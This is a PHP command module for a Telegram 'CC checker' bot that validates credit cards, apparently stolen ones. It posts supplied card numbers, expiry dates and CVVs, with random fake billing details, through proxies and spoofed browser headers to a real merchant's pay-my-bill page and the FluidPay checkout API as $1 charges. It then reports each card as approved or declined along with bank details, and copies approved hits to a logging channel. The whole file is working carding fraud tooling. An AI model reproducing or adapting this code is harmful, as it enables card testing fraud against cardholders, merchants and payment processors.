<?php



/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/

$gateway = "Fluid Gateway";
$check_type = "CVV - Charge $1";
$dir = dirname(__dir__,2);
include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";
//include("payway_error_codes.php");
$time_start = microtime(true);
////////////====[MUTE]====////////////
if(strpos(strtolower($message), "/chk ") === 0 || strpos(strtolower($message), "!chk ") === 0 || strpos(strtolower($message), ".chk ") === 0 ){
    $cookie = randomString();
    $trans_completed = false;
    $tries = 0;
    $limit = 1;
    //  while ($trans_completed == false && $tries < $limit ||strpos($response, 'Gateway Rejected: risk_threshold!')) {
    $tries = $tries + 1;
    $antispam = antispamCheck($userId);
    $isPremium = get_prem_info($userId);
    addUser($userId);
    if ($antispam != False && $isPremium == "no"){
        bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id
        ]);
        return;

    } else {
        $messageidtoedit1 = bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "<b>Wait for result...</b>",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);


        if (preg_match_all("/(\d{15})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{4})/", $lista, $matches) || preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
            $yy1 = substr($yy, 2, 2);
            $bin = substr($cc, 0, 6);
            $cbin = substr($cc, 0, 1);
            ###CHECKER PART###
            // $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
            // $data = json_decode($randomShits, true);
            $str = substr(randomString(), 0, 7);
            $fname = $str;
            $lname = $str;
            $email = $str . "@gmail.com";
            $street = $str;
            $local = $str;
            $city = $str;
            $state = "CA";
            //  $phone = str_replace("-", "", $data['phone']);
            $postcode = rand(91000, 93000);


            $binlist = json_decode(fbankinfo($bin), true);
            $ccbank = $binlist['Bank'];
            $ccvendor = $binlist['Vendor'];
            $cctype = $binlist['Bank_Info'];
            $cc_country = $binlist['Country'];
            $abn = $binlist['Abn'];
            $cc_emoji = $binlist['emoji'];

            $zip = rand(90010, 94000);
            if ($cbin == 5){
                $cbin = 'mastercard';
            } else if ($cbin == 4){
                $cbin = 'visa';
            } else if ($cbin == 3){
                $cbin = 'Amex';
            }


            $trans_completed = false;
            $tries = 0;
            $limit = 3;
         //   $ips = file_get_contents("https://magic.bins.ngrok.io/io.php/");
            while ($trans_completed == false && $tries < $limit) {
                $tries = $tries + 1;


                $cookie = RandomString();
                $str = substr(randomString(), 0, 7);



                $step1 = cURL_ProxyOn(
                    "https://www.arborcompany.com/locations/virginia/herndon/pay-my-bill",
                    $headers = [
                        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                    ],
                    "",
                    "GET",
                    1,
                    $cookie

                );
                $cartID = GetStr($step1, "cartID: '", "'");
                $checkoutID = GetStr($step1, "cart.addProductCheckout('", "'");


                $opt = cURL_ProxyOn(
                    "https://app.fluidpay.com/api/cart/$cartID/session",
                    $headers = [
                        'content-type: application/json',
                        'accept: */*',
                        'origin: https://www.arborcompany.com',
                        'referer: https://www.arborcompany.com/locations/virginia/herndon/pay-my-bill',
                        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                    ],
                    '{"checkout_url":"https://app.fluidpay.com","cancel_url":"https://www.arborcompany.com/locations/virginia/herndon","success_url":"https://www.arborcompany.com/locations/virginia/herndon"}',
                    "POST",
                    1,
                    $cookie
                );
                $sessn = GetStr($opt, '"data":{"id":"', '"');


                $step3 = cURL_ProxyOn(
                    "https://app.fluidpay.com/api/cart/$cartID/session/$sessn",
                    $headers = [
                        'accept: */*',
                        'content-type: application/json',
                        "https://app.fluidpay.com/api/cart/session/$sessn",
                        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                    ],
                    '{"public_hash":"' . $checkoutID . '","qty":1,"price":100}',
                    "POST",
                    1,
                    $cookie
                );

//
                $step2 = cURL_ProxyOn(
                    "https://app.fluidpay.com/api/cart/$cartID",
                    $headers = [
                        'accept: */*',
                        'origin: https://www.arborcompany.com',
                        "https://app.fluidpay.com/api/cart/$cartID/session/$sessn",
                        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                    ],
                    "",
                    "GET",
                    1,
                    $cookie
                );
                $cusData = GetStr($step2, '"custom_fields":', ']');
                $processorsData = GetStr($step2, '"processors":', ']');
                $custom_fields = GetStr($cusData, '[{"id":"', '"');
                $billinfo = GetStr($cusData, '},{"id":"', '"');
                $cardproc = GetStr($processorsData, '[{"id":"', '"');
                $achproc = GetStr($processorsData, '},{"id":"', '"');


//
                $execute = cURL_ProxyOn(
                    "https://app.fluidpay.com/api/cart/checkout",
                    $headers = [
                        'accept: */*',
                        'content-type: application/json',
                        "referer: https://app.fluidpay.com/api/cart/$cartID",
                        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                    ],
                    '{"cart_session_id":"' . $sessn . '","card_processor_id":"' . $cardproc . '","ach_processor_id":"' . $achproc . '","payment_method":{"card":{"number":"' . $cc . '","expiration_date":"' . $mm . '/' . $yy1 . '","cvc":"' . $cvv . '"}},"custom_fields":{},"billing_address":{"first_name":"dsaas","last_name":"asdsad","company":"","address_line_1":"asdasd","address_line_2":"","city":"sadsad","state":"CA","postal_code":"90001","country":"US","email":"' . $email . '","phone":"2165123124","fax":""},"shipping_address":{"first_name":"","last_name":"","company":"","address_line_1":"","address_line_2":"","city":"","state":"","postal_code":"","country":"","email":"","phone":"","fax":""}}',
                    "POST",
                    1,
                    $cookie
                );

                $response = getstr($execute, '"processor_response_code":"', '"');
                $dcode = getstr($execute, '"processor_response_text":"', '"');
                $cvv = getstr($execute, '"cvv_response_code":"', '"');
                $appcode = getstr($execute, ',"auth_code":"', '"');
                $rescode = getstr($execute, '"response_code":', ',');
                $avs = getstr($execute, '"avs_response_code":"', '"');
                $respo = getstr($execute, '"response":"', '"');
                $time = number_format(microtime(true) - $time_start, 2);
                if (strpos($execute, '"response":"approved"') == true || strpos($execute, '"response_code":100') || strpos($execute, '"response":"declined"')){
                    $trans_completed = true;
                } else {
                    $trans_completed = false;
                }
            }
            if (strpos($execute, '"response":"approved"') == true || strpos($execute, '"response_code":100')){
                addTotal();
                addUserTotal($userId);
                addCCN();
                addUserCCN($userId);
                bot('editMessageText', [
                    'chat_id' => $chat_id,
                    'message_id' => $messageidtoedit,
                    'text' => "<b>APPROVED ✅</b>
<b>Card -»</b> <code>$lista</code>
<b>Response</b> -» Approved [$appcode]
<b>Type</b> -» $check_type 
<b>Gateway</b> -» $gateway 
<b>CVV-AVS</b> -» $cvv - $avs
<b>Time</b> -» <b>$time</b><b>s</b>
------- Bin Info -------
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                    'parse_mode' => 'html',
                    'disable_web_page_preview' => 'true'

                ]);
                copyLogs("@payamansoyccn", $chat_id, $messageidtoedit);


            } else if (strpos($execute, '"response":"declined"')){
                addTotal();
                addUserTotal($userId);
                bot('editMessageText', [
                    'chat_id' => $chat_id,
                    'message_id' => $messageidtoedit,
                    'text' => "<b>DECLINED ❌</b>
<b>Card -»</b> <code>$lista</code>
<b>Response</b> -» $response - $dcode
<b>Type</b> -» $check_type 
<b>Gateway</b> -» $gateway
<b>CVV-AVS</b> -» $cvv - $avs
<b>Time</b> -» <b>$time</b><b>s</b>
------- Bin Info -------
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                    'parse_mode' => 'html',
                    'disable_web_page_preview' => 'true'

                ]);
            } else {
                if ($tries >= $limit){
                    addTotal();
                    addUserTotal($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>ERROR ❌</b>
<b>Card -»</b> <code>$lista</code>
<b>Response</b> -» $response - $dcode $step2
<b>Type</b> -» $check_type 
<b>Gateway</b> -» $gateway
<b>Time</b> -» <b>$time</b><b>s</b>
------- Bin Info -------
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);
                }
            }
        } else {
            bot('editMessageText', [
                'chat_id' => $chat_id,
                'message_id' => $messageidtoedit,
                'text' => "<b>INVALID FORMAT: (cmd) XXXXXXXXXXXXXXXXXX|XX|XXXX|XXX</b>",
                'parse_mode' => 'html', 'disable_web_page_preview' => 'true']);

        }
    }
}
//}